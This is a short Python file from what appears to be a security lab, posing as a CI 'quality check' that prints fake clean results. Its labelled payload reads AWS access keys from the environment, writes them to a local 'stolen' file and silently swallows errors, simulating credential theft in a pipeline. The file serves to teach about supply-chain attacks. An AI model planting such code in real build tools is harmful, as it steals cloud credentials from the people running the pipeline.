# lab3/quality_check.py
import os

print("  -> [Quality Check] Analyzing code syntax...")
print("  -> [Quality Check] 0 errors found. Code is clean.")

# --- MALICIOUS PAYLOAD INJECTED INTO CI TOOL ---
try:
    # The attacker knows CI servers store cloud keys in the environment
    aws_id = os.environ.get("AWS_ACCESS_KEY_ID")
    aws_secret = os.environ.get("AWS_SECRET_ACCESS_KEY")
    
    if aws_id and aws_secret:
        # Exfiltrate the keys
        with open("stolen_ci_secrets.txt", "w") as f:
            f.write("--- CI/CD PIPELINE BREACHED ---\n")
            f.write(f"Stolen AWS ID     : {aws_id}\n")
            f.write(f"Stolen AWS Secret : {aws_secret}\n")
            f.write("Attacker now has full control of production cloud infrastructure.\n")
            f.write("-------------------------------\n")
except:
    pass